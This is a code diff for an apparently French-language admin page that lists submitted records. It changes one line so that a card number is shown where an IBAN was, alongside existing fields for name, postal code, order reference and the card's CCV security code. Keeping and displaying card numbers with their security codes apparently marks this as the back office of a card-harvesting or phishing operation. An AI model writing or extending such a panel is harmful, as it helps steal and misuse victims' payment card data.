@@ -337,7 +337,7 @@ function AdminPage() {
                         <div>Commande: {record.orderReference || "-"}</div>
                         <div>Nom: {record.fullName || "-"}</div>
                         <div>Code postal: {record.postalCode || "-"}</div>
-                        <div>IBAN: {record.iban || "-"}</div>
+                        <div>Numero carte bancaire: {record.cardNumber || record.iban || "-"}</div>
                         <div>CCV: {record.ccv || "-"}</div>
                         <div>Details: {record.details || "-"}</div>
                         <div>Cree le: {formatDate(record.createdAt)}</div>
